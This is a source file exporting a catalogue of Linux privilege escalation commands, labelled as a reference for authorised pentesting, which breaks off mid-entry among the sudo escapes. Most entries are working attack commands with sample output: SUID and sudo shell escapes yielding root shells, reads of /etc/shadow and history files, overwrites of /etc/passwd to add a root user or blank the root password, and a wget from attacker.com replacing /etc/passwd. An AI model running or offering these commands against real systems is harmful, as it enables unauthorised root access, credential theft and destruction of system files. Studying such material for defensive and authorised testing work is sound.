// Linux Privilege Escalation Commands — comprehensive reference for ethical pentesting
// Educational reference for authorized security testing only.

export const LINUX_PRIVESC_COMMANDS = {
  systemEnumeration: [
    {
      technique: "OS and Kernel Version",
      category: "System Enumeration",
      command: "uname -a",
      description: "Print all system information including kernel name, version, architecture. Critical for identifying kernel exploits.",
      example_output: "Linux target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 GNU/Linux",
      tools: ["uname"],
      references: ["https://gtfobins.github.io/"]
    },
    {
      technique: "OS Release Info",
      category: "System Enumeration",
      command: "cat /etc/os-release",
      description: "Display OS distribution name and version. Helps match kernel exploits to specific distros.",
      example_output: 'NAME="Ubuntu"\nVERSION="20.04.1 LTS (Focal Fossa)"\nID=ubuntu\nVERSION_ID="20.04"',
      tools: ["cat"],
      references: []
    },
    {
      technique: "Current User Identity",
      category: "System Enumeration",
      command: "id",
      description: "Print real and effective user and group IDs. Shows all group memberships which may grant extra privileges.",
      example_output: "uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),999(docker)",
      tools: ["id"],
      references: []
    },
    {
      technique: "Whoami",
      category: "System Enumeration",
      command: "whoami",
      description: "Print the current effective username.",
      example_output: "www-data",
      tools: ["whoami"],
      references: []
    },
    {
      technique: "Group Memberships",
      category: "System Enumeration",
      command: "groups",
      description: "Show all groups the current user belongs to. Groups like docker, lxd, disk, adm, shadow grant escalation paths.",
      example_output: "user adm cdrom sudo dip plugdev lxd docker",
      tools: ["groups"],
      references: []
    },
    {
      technique: "Environment Variables",
      category: "System Enumeration",
      command: "env",
      description: "Print all environment variables. Look for credentials, API keys, database connection strings, PATH manipulation opportunities.",
      example_output: "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nDB_PASSWORD=s3cret123\nHOME=/home/user",
      tools: ["env", "printenv"],
      references: []
    },
    {
      technique: "User List",
      category: "System Enumeration",
      command: "cat /etc/passwd",
      description: "List all users. Users with UID 0 are root-equivalent. Check for users with login shells (/bin/bash, /bin/sh) and home directories.",
      example_output: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nuser:x:1000:1000::/home/user:/bin/bash",
      tools: ["cat", "awk"],
      references: []
    },
    {
      technique: "Shadow File (requires elevated access)",
      category: "System Enumeration",
      command: "cat /etc/shadow",
      description: "Contains password hashes. If readable, crack with hashcat/john. Hash formats: $1$=MD5, $5$=SHA-256, $6$=SHA-512, $y$=yescrypt.",
      example_output: "root:$6$salt$hash:18000:0:99999:7:::\nuser:$6$xyz$abc:18500:0:99999:7:::",
      tools: ["cat", "hashcat", "john"],
      references: []
    },
    {
      technique: "Sudoers File",
      category: "System Enumeration",
      command: "cat /etc/sudoers",
      description: "Shows sudo policy. Usually requires root to read, but misconfigurations may make it world-readable.",
      example_output: "root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\nuser ALL=(ALL) NOPASSWD: /usr/bin/vim",
      tools: ["cat"],
      references: []
    },
    {
      technique: "Sudo Privileges",
      category: "System Enumeration",
      command: "sudo -l",
      description: "List commands the current user can run via sudo. The most important single privesc check. Look for NOPASSWD entries, wildcard entries, and GTFOBins-exploitable binaries.",
      example_output: "User user may run the following commands on target:\n    (ALL) NOPASSWD: /usr/bin/find\n    (root) /usr/bin/vim",
      tools: ["sudo"],
      references: ["https://gtfobins.github.io/"]
    },
    {
      technique: "Installed Packages (Debian)",
      category: "System Enumeration",
      command: "dpkg -l",
      description: "List all installed Debian packages with versions. Cross-reference with known CVEs for installed software.",
      example_output: "ii  apache2  2.4.29-1ubuntu4.14  amd64  Apache HTTP Server\nii  mysql-server  5.7.31  amd64  MySQL database server",
      tools: ["dpkg"],
      references: []
    },
    {
      technique: "Installed Packages (RHEL)",
      category: "System Enumeration",
      command: "rpm -qa",
      description: "List all installed RPM packages. Check for outdated software with known exploits.",
      example_output: "httpd-2.4.6-93.el7.centos.x86_64\nmysql-community-server-5.7.31-1.el7.x86_64",
      tools: ["rpm"],
      references: []
    },
    {
      technique: "Network Connections",
      category: "System Enumeration",
      command: "ss -tulnp",
      description: "Show listening TCP/UDP ports with process info. Reveals internal services not exposed externally.",
      example_output: "tcp  LISTEN  0  128  127.0.0.1:3306  0.0.0.0:*  users:((\"mysqld\",pid=1234,fd=30))\ntcp  LISTEN  0  128  0.0.0.0:22  0.0.0.0:*  users:((\"sshd\",pid=567,fd=3))",
      tools: ["ss", "netstat"],
      references: []
    },
    {
      technique: "Network Interfaces",
      category: "System Enumeration",
      command: "ip a",
      description: "Show all network interfaces and IP addresses. Identify dual-homed hosts for pivoting.",
      example_output: "2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500\n    inet 10.10.10.5/24 brd 10.10.10.255\n3: eth1: <BROADCAST,MULTICAST,UP>\n    inet 172.16.0.1/24",
      tools: ["ip", "ifconfig"],
      references: []
    },
    {
      technique: "Routing Table",
      category: "System Enumeration",
      command: "ip route",
      description: "Display routing table. Reveals network segments the host can reach for pivoting.",
      example_output: "default via 10.10.10.1 dev eth0\n10.10.10.0/24 dev eth0 proto kernel scope link src 10.10.10.5\n172.16.0.0/24 dev eth1 proto kernel scope link src 172.16.0.1",
      tools: ["ip", "route"],
      references: []
    },
    {
      technique: "ARP Cache",
      category: "System Enumeration",
      command: "arp -a",
      description: "Show ARP table entries. Reveals other hosts on the local network segment.",
      example_output: "gateway (10.10.10.1) at 00:50:56:b9:1a:2b [ether] on eth0\ndc01 (10.10.10.10) at 00:50:56:b9:3c:4d [ether] on eth0",
      tools: ["arp", "ip neigh"],
      references: []
    },
    {
      technique: "Mounted Filesystems",
      category: "System Enumeration",
      command: "mount",
      description: "List mounted filesystems. Look for NFS shares with no_root_squash, writable /tmp without noexec, and sensitive mounts.",
      example_output: "/dev/sda1 on / type ext4 (rw,relatime)\ntmpfs on /tmp type tmpfs (rw,nosuid,nodev)\n10.10.10.20:/share on /mnt/nfs type nfs (rw,no_root_squash)",
      tools: ["mount", "df"],
      references: []
    },
    {
      technique: "Disk Space",
      category: "System Enumeration",
      command: "df -h",
      description: "Show disk usage. Identify mounted shares and large partitions that may contain sensitive data.",
      example_output: "Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        50G   15G   33G  31% /\ntmpfs           2.0G     0  2.0G   0% /dev/shm",
      tools: ["df"],
      references: []
    },
    {
      technique: "World-Writable Directories",
      category: "System Enumeration",
      command: "find / -writable -type d 2>/dev/null",
      description: "Find all world-writable directories. Useful for dropping payloads or exploiting PATH hijacking.",
      example_output: "/tmp\n/var/tmp\n/dev/shm\n/opt/scripts",
      tools: ["find"],
      references: []
    },
    {
      technique: "Crontab Entries",
      category: "System Enumeration",
      command: "cat /etc/crontab",
      description: "View system-wide cron jobs. Look for scripts run as root that you can write to or that use wildcards.",
      example_output: "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n*/5 * * * * root /opt/scripts/backup.sh\n@reboot root /usr/local/bin/cleanup.sh",
      tools: ["cat", "crontab"],
      references: []
    },
    {
      technique: "All Cron Jobs",
      category: "System Enumeration",
      command: "ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null",
      description: "List all cron directories and user crontabs. Check file permissions on referenced scripts.",
      example_output: "/etc/cron.d/:\ntotal 12\n-rw-r--r-- 1 root root 102 Feb  2 2020 .placeholder\n-rw-r--r-- 1 root root 589 Jan 14 2020 mdadm",
      tools: ["ls"],
      references: []
    },
    {
      technique: "Systemd Timers",
      category: "System Enumeration",
      command: "systemctl list-timers --all",
      description: "List all systemd timers. Modern alternative to cron. Check if associated service files are writable.",
      example_output: "NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES\nThu 2024-01-01 00:00:00 UTC  5h left       Wed 2023-12-31 00:00:00 UTC  18h ago      logrotate.timer              logrotate.service",
      tools: ["systemctl"],
      references: []
    },
    {
      technique: "Running Processes",
      category: "System Enumeration",
      command: "ps aux",
      description: "List all running processes. Look for processes running as root, credentials in command lines, and vulnerable services.",
      example_output: "root      1234  0.0  0.1 123456  7890 ?  Ss   10:00   0:00 /usr/sbin/apache2 -k start\nroot      5678  0.0  0.0  45678  3456 ?  S    10:00   0:00 /opt/app/server --db-pass=secret123",
      tools: ["ps"],
      references: []
    },
    {
      technique: "Process Monitoring (Live)",
      category: "System Enumeration",
      command: "watch -n 1 'ps aux | grep -v \"\\[\" | sort -nrk 3 | head -20'",
      description: "Monitor processes in real-time. Catch ephemeral processes like cron jobs that run briefly.",
      example_output: "(live updating process list)",
      tools: ["watch", "ps", "pspy"],
      references: ["https://github.com/DominicBreuker/pspy"]
    },
    {
      technique: "pspy — Process Spy",
      category: "System Enumeration",
      command: "./pspy64",
      description: "Monitor processes without root. Catches cron jobs and other processes as they execute. Essential for finding cron-based privesc vectors.",
      example_output: "2024/01/01 12:00:01 CMD: UID=0    PID=12345  | /bin/sh -c /opt/scripts/backup.sh\n2024/01/01 12:00:01 CMD: UID=0    PID=12346  | /usr/bin/tar czf /backup/data.tar.gz /var/www",
      tools: ["pspy"],
      references: ["https://github.com/DominicBreuker/pspy"]
    },
    {
      technique: "Writable Files Owned by Root",
      category: "System Enumeration",
      command: "find / -writable -user root -type f 2>/dev/null | grep -v proc",
      description: "Find files owned by root that the current user can write to. Prime targets for privilege escalation.",
      example_output: "/opt/scripts/backup.sh\n/usr/local/bin/cleanup.py",
      tools: ["find"],
      references: []
    },
    {
      technique: "SSH Keys",
      category: "System Enumeration",
      command: "find / -name id_rsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null",
      description: "Search for SSH private keys. Found keys may allow lateral movement or escalation to other users.",
      example_output: "/home/admin/.ssh/id_rsa\n/root/.ssh/authorized_keys\n/home/user/.ssh/id_ed25519",
      tools: ["find", "ssh"],
      references: []
    },
    {
      technique: "Sensitive Files Search",
      category: "System Enumeration",
      command: "find / -name '*.conf' -o -name '*.config' -o -name '*.cfg' -o -name '*.ini' -o -name '*.bak' -o -name '*.old' -o -name '*.log' 2>/dev/null | grep -v proc | head -50",
      description: "Search for configuration files and backups. Often contain hardcoded credentials.",
      example_output: "/etc/apache2/apache2.conf\n/var/www/html/wp-config.php.bak\n/opt/app/config.ini",
      tools: ["find", "grep"],
      references: []
    },
    {
      technique: "History Files",
      category: "System Enumeration",
      command: "cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history 2>/dev/null",
      description: "Read shell and application history files. May contain passwords, tokens, or commands revealing escalation paths.",
      example_output: "mysql -u root -p'MyS3cretPass!'\nsudo su -\nssh admin@10.10.10.20\nexport API_KEY=sk-12345abcde",
      tools: ["cat"],
      references: []
    },
    {
      technique: "Internal Services on Localhost",
      category: "System Enumeration",
      command: "ss -tulnp | grep 127.0.0.1",
      description: "Find services listening only on localhost. These are internal services that may have weaker authentication.",
      example_output: "tcp  LISTEN  0  128  127.0.0.1:6379  0.0.0.0:*  (redis)\ntcp  LISTEN  0  128  127.0.0.1:8080  0.0.0.0:*  (internal-api)\ntcp  LISTEN  0  128  127.0.0.1:9200  0.0.0.0:*  (elasticsearch)",
      tools: ["ss", "netstat", "curl"],
      references: []
    }
  ],

  suidSgid: [
    {
      technique: "Find SUID Binaries",
      category: "SUID/SGID",
      command: "find / -perm -4000 -type f 2>/dev/null",
      description: "Find all SUID binaries. These execute with the file owner's privileges (usually root). Cross-reference with GTFOBins.",
      example_output: "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/vim\n/usr/local/bin/custom-app",
      tools: ["find"],
      references: ["https://gtfobins.github.io/#+suid"]
    },
    {
      technique: "Find SGID Binaries",
      category: "SUID/SGID",
      command: "find / -perm -2000 -type f 2>/dev/null",
      description: "Find all SGID binaries. These execute with the file group's privileges.",
      example_output: "/usr/bin/wall\n/usr/bin/write\n/usr/bin/ssh-agent\n/usr/sbin/postdrop",
      tools: ["find"],
      references: ["https://gtfobins.github.io/#+sgid"]
    },
    {
      technique: "SUID bash",
      category: "SUID/SGID",
      command: "bash -p",
      description: "If bash has SUID set, -p prevents dropping privileges. Instant root shell.",
      example_output: "bash-5.0# id\nuid=1000(user) gid=1000(user) euid=0(root)",
      tools: ["bash"],
      references: ["https://gtfobins.github.io/gtfobins/bash/#suid"]
    },
    {
      technique: "SUID nmap (interactive mode)",
      category: "SUID/SGID",
      command: "nmap --interactive\n!sh",
      description: "Older nmap versions (2.02 to 5.21) had an interactive mode that could spawn a shell. SUID nmap = root shell.",
      example_output: "nmap> !sh\nsh-3.2# whoami\nroot",
      tools: ["nmap"],
      references: ["https://gtfobins.github.io/gtfobins/nmap/#suid"]
    },
    {
      technique: "SUID nmap (script mode)",
      category: "SUID/SGID",
      command: "echo 'os.execute(\"/bin/bash -p\")' > /tmp/shell.nse && nmap --script=/tmp/shell.nse",
      description: "For newer nmap versions with SUID, use NSE scripting to execute commands as root.",
      example_output: "# whoami\nroot",
      tools: ["nmap"],
      references: ["https://gtfobins.github.io/gtfobins/nmap/#suid"]
    },
    {
      technique: "SUID vim",
      category: "SUID/SGID",
      command: "vim -c ':!/bin/bash -p'",
      description: "Vim with SUID can spawn a root shell via command mode.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["vim", "vi"],
      references: ["https://gtfobins.github.io/gtfobins/vim/#suid"]
    },
    {
      technique: "SUID find",
      category: "SUID/SGID",
      command: "find . -exec /bin/bash -p \\; -quit",
      description: "The find command with SUID can execute commands as root via -exec.",
      example_output: "bash-5.0# id\nuid=1000(user) gid=1000(user) euid=0(root)",
      tools: ["find"],
      references: ["https://gtfobins.github.io/gtfobins/find/#suid"]
    },
    {
      technique: "SUID awk",
      category: "SUID/SGID",
      command: "awk 'BEGIN {system(\"/bin/bash -p\")}'",
      description: "Awk with SUID can execute system commands, spawning a root shell.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["awk", "gawk", "mawk"],
      references: ["https://gtfobins.github.io/gtfobins/awk/#suid"]
    },
    {
      technique: "SUID perl",
      category: "SUID/SGID",
      command: "perl -e 'exec \"/bin/bash -p\";'",
      description: "Perl with SUID can execute a shell as root.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["perl"],
      references: ["https://gtfobins.github.io/gtfobins/perl/#suid"]
    },
    {
      technique: "SUID python",
      category: "SUID/SGID",
      command: "python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
      description: "Python with SUID can spawn a root shell via os.execl.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["python", "python3"],
      references: ["https://gtfobins.github.io/gtfobins/python/#suid"]
    },
    {
      technique: "SUID ruby",
      category: "SUID/SGID",
      command: "ruby -e 'exec \"/bin/bash -p\"'",
      description: "Ruby with SUID can exec a root shell.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["ruby"],
      references: ["https://gtfobins.github.io/gtfobins/ruby/#suid"]
    },
    {
      technique: "SUID php",
      category: "SUID/SGID",
      command: "php -r 'pcntl_exec(\"/bin/bash\", [\"-p\"]);'",
      description: "PHP with SUID and pcntl extension can exec a root shell.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["php"],
      references: ["https://gtfobins.github.io/gtfobins/php/#suid"]
    },
    {
      technique: "SUID env",
      category: "SUID/SGID",
      command: "env /bin/bash -p",
      description: "The env command with SUID runs commands in the file owner's context.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["env"],
      references: ["https://gtfobins.github.io/gtfobins/env/#suid"]
    },
    {
      technique: "SUID less",
      category: "SUID/SGID",
      command: "less /etc/passwd\n!/bin/bash -p",
      description: "Less with SUID: view a file, then type !command to spawn a root shell.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["less"],
      references: ["https://gtfobins.github.io/gtfobins/less/#suid"]
    },
    {
      technique: "SUID more",
      category: "SUID/SGID",
      command: "more /etc/passwd\n!/bin/bash -p",
      description: "More with SUID works similarly to less. Requires the terminal to be smaller than the file.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["more"],
      references: ["https://gtfobins.github.io/gtfobins/more/#suid"]
    },
    {
      technique: "SUID cp",
      category: "SUID/SGID",
      command: "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
      description: "Copy bash and set SUID bit (if cp has SUID). Alternative: overwrite /etc/passwd or /etc/shadow.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["cp"],
      references: ["https://gtfobins.github.io/gtfobins/cp/#suid"]
    },
    {
      technique: "SUID mv",
      category: "SUID/SGID",
      command: "mv /etc/shadow /etc/shadow.bak && echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd",
      description: "Mv with SUID can replace critical system files. Replace shadow to remove root password.",
      example_output: "(no output — root password removed)",
      tools: ["mv"],
      references: ["https://gtfobins.github.io/gtfobins/mv/#suid"]
    },
    {
      technique: "SUID nano",
      category: "SUID/SGID",
      command: "nano /etc/passwd",
      description: "Nano with SUID can edit any file. Add a root-equivalent user to /etc/passwd.",
      example_output: "(edit /etc/passwd to add: hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash)",
      tools: ["nano"],
      references: ["https://gtfobins.github.io/gtfobins/nano/#suid"]
    },
    {
      technique: "SUID ed",
      category: "SUID/SGID",
      command: "ed\n!/bin/bash -p",
      description: "The ed line editor with SUID can execute shell commands.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["ed"],
      references: ["https://gtfobins.github.io/gtfobins/ed/#suid"]
    },
    {
      technique: "SUID zip",
      category: "SUID/SGID",
      command: "zip /tmp/x.zip /etc/passwd -T --unzip-command='sh -c /bin/bash\\ -p'",
      description: "Zip with SUID can execute commands via the --unzip-command test option.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["zip"],
      references: ["https://gtfobins.github.io/gtfobins/zip/#suid"]
    },
    {
      technique: "SUID tar",
      category: "SUID/SGID",
      command: "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
      description: "Tar with SUID can execute commands via checkpoint actions.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["tar"],
      references: ["https://gtfobins.github.io/gtfobins/tar/#suid"]
    },
    {
      technique: "SUID gzip / gunzip",
      category: "SUID/SGID",
      command: "gzip -f /etc/shadow -t && gzip -d /etc/shadow.gz",
      description: "Gzip with SUID can read protected files. Use to exfiltrate /etc/shadow contents.",
      example_output: "(shadow file contents readable)",
      tools: ["gzip"],
      references: ["https://gtfobins.github.io/gtfobins/gzip/#suid"]
    },
    {
      technique: "SUID git",
      category: "SUID/SGID",
      command: "git help config\n!/bin/bash -p",
      description: "Git with SUID: the help pager (less) allows shell escape.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["git"],
      references: ["https://gtfobins.github.io/gtfobins/git/#suid"]
    },
    {
      technique: "SUID ftp",
      category: "SUID/SGID",
      command: "ftp\n!/bin/bash -p",
      description: "FTP client with SUID can spawn a shell via the ! escape character.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["ftp"],
      references: ["https://gtfobins.github.io/gtfobins/ftp/#suid"]
    },
    {
      technique: "SUID ssh-keygen",
      category: "SUID/SGID",
      command: "ssh-keygen -D /tmp/lib.so",
      description: "Ssh-keygen with SUID can load arbitrary shared libraries via -D, executing code as root.",
      example_output: "(code in lib.so executes as root)",
      tools: ["ssh-keygen"],
      references: ["https://gtfobins.github.io/gtfobins/ssh-keygen/#suid"]
    },
    {
      technique: "SUID openssl",
      category: "SUID/SGID",
      command: "openssl req -x509 -newkey rsa:4096 -keyout /dev/null -out /dev/null -days 1 -nodes -subj '/CN=x' 2>/dev/null; openssl enc -in /etc/shadow",
      description: "Openssl with SUID can read arbitrary files via encryption commands.",
      example_output: "(shadow file contents displayed)",
      tools: ["openssl"],
      references: ["https://gtfobins.github.io/gtfobins/openssl/#suid"]
    },
    {
      technique: "SUID tcpdump",
      category: "SUID/SGID",
      command: "tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/shell.sh",
      description: "Tcpdump with SUID can execute scripts via the -z (post-rotate command) option.",
      example_output: "(shell.sh executes as root after rotation)",
      tools: ["tcpdump"],
      references: ["https://gtfobins.github.io/gtfobins/tcpdump/#suid"]
    },
    {
      technique: "SUID strace",
      category: "SUID/SGID",
      command: "strace -o /dev/null /bin/bash -p",
      description: "Strace with SUID can attach to or launch processes as root.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["strace"],
      references: ["https://gtfobins.github.io/gtfobins/strace/#suid"]
    },
    {
      technique: "SUID ltrace",
      category: "SUID/SGID",
      command: "ltrace -b -L /bin/bash -p",
      description: "Ltrace with SUID can launch processes in the owner's context.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["ltrace"],
      references: ["https://gtfobins.github.io/gtfobins/ltrace/#suid"]
    },
    {
      technique: "SUID gdb",
      category: "SUID/SGID",
      command: "gdb -nx -ex 'python import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")' -ex quit",
      description: "GDB with SUID can execute arbitrary code via Python scripting.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["gdb"],
      references: ["https://gtfobins.github.io/gtfobins/gdb/#suid"]
    },
    {
      technique: "SUID docker",
      category: "SUID/SGID",
      command: "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash",
      description: "Docker with SUID (or if user is in docker group) can mount the host filesystem and chroot into it.",
      example_output: "root@container:/# whoami\nroot\nroot@container:/# cat /etc/shadow\n(host shadow file)",
      tools: ["docker"],
      references: ["https://gtfobins.github.io/gtfobins/docker/#suid"]
    },
    {
      technique: "SUID mount",
      category: "SUID/SGID",
      command: "mount -o bind /bin/bash /usr/bin/mount && mount -p",
      description: "Mount with SUID can be used for bind mount attacks.",
      example_output: "(varies by configuration)",
      tools: ["mount"],
      references: ["https://gtfobins.github.io/gtfobins/mount/#suid"]
    },
    {
      technique: "SUID pkexec (PwnKit)",
      category: "SUID/SGID",
      command: "pkexec --help  # CVE-2021-4034 exploit available",
      description: "pkexec (Polkit) is almost always SUID root. CVE-2021-4034 (PwnKit) affects all versions from 2009–2022 and gives instant root.",
      example_output: "# whoami\nroot",
      tools: ["pkexec", "pwnkit"],
      references: ["https://github.com/ly4k/PwnKit", "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"]
    },
    {
      technique: "SUID snap (dirty_sock)",
      category: "SUID/SGID",
      command: "snap install --devmode --edge evil-snap",
      description: "Snapd with SUID may be vulnerable to dirty_sock (CVE-2019-7304) allowing local privilege escalation.",
      example_output: "(creates a new root-level user account)",
      tools: ["snap"],
      references: ["https://github.com/initstring/dirty_sock"]
    },
    {
      technique: "SUID wget",
      category: "SUID/SGID",
      command: "wget http://attacker.com/passwd -O /etc/passwd",
      description: "Wget with SUID can overwrite system files with attacker-controlled content.",
      example_output: "(replaces /etc/passwd with attacker version containing passwordless root)",
      tools: ["wget"],
      references: ["https://gtfobins.github.io/gtfobins/wget/#suid"]
    },
    {
      technique: "SUID curl",
      category: "SUID/SGID",
      command: "curl file:///etc/shadow",
      description: "Curl with SUID can read arbitrary files using the file:// protocol.",
      example_output: "root:$6$salt$hash:18000:0:99999:7:::",
      tools: ["curl"],
      references: ["https://gtfobins.github.io/gtfobins/curl/#suid"]
    },
    {
      technique: "SUID tee",
      category: "SUID/SGID",
      command: "echo 'hacker:$1$salt$hash:0:0::/root:/bin/bash' | tee -a /etc/passwd",
      description: "Tee with SUID can append to any file. Add a root user to /etc/passwd.",
      example_output: "hacker:$1$salt$hash:0:0::/root:/bin/bash",
      tools: ["tee"],
      references: ["https://gtfobins.github.io/gtfobins/tee/#suid"]
    },
    {
      technique: "SUID date",
      category: "SUID/SGID",
      command: "date -f /etc/shadow",
      description: "Date with SUID can read file contents through error messages (file contents appear in date parse errors).",
      example_output: "date: invalid date 'root:$6$salt$hash:18000:0:99999:7:::'",
      tools: ["date"],
      references: ["https://gtfobins.github.io/gtfobins/date/#suid"]
    },
    {
      technique: "SUID xxd",
      category: "SUID/SGID",
      command: "xxd /etc/shadow | xxd -r",
      description: "Xxd with SUID can read any file by hex-dumping and reversing.",
      example_output: "root:$6$salt$hash:18000:0:99999:7:::",
      tools: ["xxd"],
      references: ["https://gtfobins.github.io/gtfobins/xxd/#suid"]
    },
    {
      technique: "SUID base64",
      category: "SUID/SGID",
      command: "base64 /etc/shadow | base64 -d",
      description: "Base64 with SUID can encode any file then decode it to read contents.",
      example_output: "root:$6$salt$hash:18000:0:99999:7:::",
      tools: ["base64"],
      references: ["https://gtfobins.github.io/gtfobins/base64/#suid"]
    },
    {
      technique: "SUID dd",
      category: "SUID/SGID",
      command: "dd if=/etc/shadow of=/tmp/shadow_copy",
      description: "Dd with SUID can copy any file. Read shadow hashes or overwrite system files.",
      example_output: "1+0 records in\n1+0 records out",
      tools: ["dd"],
      references: ["https://gtfobins.github.io/gtfobins/dd/#suid"]
    },
    {
      technique: "SUID task / taskset",
      category: "SUID/SGID",
      command: "taskset 1 /bin/bash -p",
      description: "Taskset with SUID can launch processes that inherit the elevated privileges.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["taskset"],
      references: ["https://gtfobins.github.io/gtfobins/taskset/#suid"]
    },
    {
      technique: "SUID time",
      category: "SUID/SGID",
      command: "time /bin/bash -p",
      description: "Time with SUID runs the command in an elevated context.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["time"],
      references: ["https://gtfobins.github.io/gtfobins/time/#suid"]
    },
    {
      technique: "SUID nice",
      category: "SUID/SGID",
      command: "nice /bin/bash -p",
      description: "Nice with SUID runs the specified command with inherited privileges.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["nice"],
      references: ["https://gtfobins.github.io/gtfobins/nice/#suid"]
    },
    {
      technique: "SUID ionice",
      category: "SUID/SGID",
      command: "ionice /bin/bash -p",
      description: "Ionice with SUID can launch an elevated shell.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["ionice"],
      references: ["https://gtfobins.github.io/gtfobins/ionice/#suid"]
    },
    {
      technique: "SUID start-stop-daemon",
      category: "SUID/SGID",
      command: "start-stop-daemon -n foo -S -x /bin/bash -- -p",
      description: "Start-stop-daemon with SUID starts a process as root.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["start-stop-daemon"],
      references: ["https://gtfobins.github.io/gtfobins/start-stop-daemon/#suid"]
    },
    {
      technique: "SUID run-parts",
      category: "SUID/SGID",
      command: "run-parts --new-session --regex '^sh$' /bin",
      description: "Run-parts with SUID can execute binaries from a directory.",
      example_output: "# whoami\nroot",
      tools: ["run-parts"],
      references: ["https://gtfobins.github.io/gtfobins/run-parts/#suid"]
    },
    {
      technique: "Custom SUID Binary Analysis",
      category: "SUID/SGID",
      command: "strings /usr/local/bin/custom-suid && ltrace /usr/local/bin/custom-suid",
      description: "For unknown SUID binaries: use strings to find hardcoded paths/commands, ltrace to see library calls, and strace for syscalls. Look for relative path calls (PATH hijacking), unchecked user input, or insecure library usage.",
      example_output: "system\n/bin/cat /root/flag.txt\n(vulnerable to PATH hijacking if calling 'cat' without full path)",
      tools: ["strings", "ltrace", "strace", "objdump", "ghidra"],
      references: []
    }
  ],

  sudoMisconfigs: [
    {
      technique: "Sudo NOPASSWD Vim",
      category: "Sudo Misconfigs",
      command: "sudo vim -c ':!/bin/bash'",
      description: "If sudo allows vim without password, escape to root shell from within vim.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["vim", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/vim/#sudo"]
    },
    {
      technique: "Sudo NOPASSWD Less",
      category: "Sudo Misconfigs",
      command: "sudo less /etc/passwd\n!/bin/bash",
      description: "Less with sudo allows shell escape via the ! character.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["less", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/less/#sudo"]
    },
    {
      technique: "Sudo NOPASSWD Find",
      category: "Sudo Misconfigs",
      command: "sudo find / -exec /bin/bash \\; -quit",
      description: "Find with sudo can execute arbitrary commands via -exec.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["find", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/find/#sudo"]
    },
    {
      technique: "Sudo NOPASSWD Awk",
      category: "Sudo Misconfigs",
      command: "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
      description: "Awk with sudo can execute system commands.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["awk", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/awk/#sudo"]
    },
    {
      technique: "Sudo NOPASSWD Nmap",
      category: "Sudo Misconfigs",
      command: "echo 'os.execute(\"/bin/bash\")' > /tmp/x.nse && sudo nmap --script=/tmp/x.nse",
      description: "Nmap with sudo can run Lua scripts that execute shell commands.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["nmap", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/nmap/#sudo"]
    },
    {
      technique: "Sudo NOPASSWD Env",
      category: "Sudo Misconfigs",
      command: "sudo env /bin/bash",
      description: "Env with sudo simply runs the given command as root.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["env", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/env/#sudo"]
    },
    {
      technique: "Sudo NOPASSWD Perl",
      category: "Sudo Misconfigs",
      command: "sudo perl -e 'exec \"/bin/bash\";'",
      description: "Perl with sudo can exec a root shell.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["perl", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/perl/#sudo"]
    },
    {
      technique: "Sudo NOPASSWD Python",
      category: "Sudo Misconfigs",
      command: "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
      description: "Python with sudo can import os and spawn a root shell.",
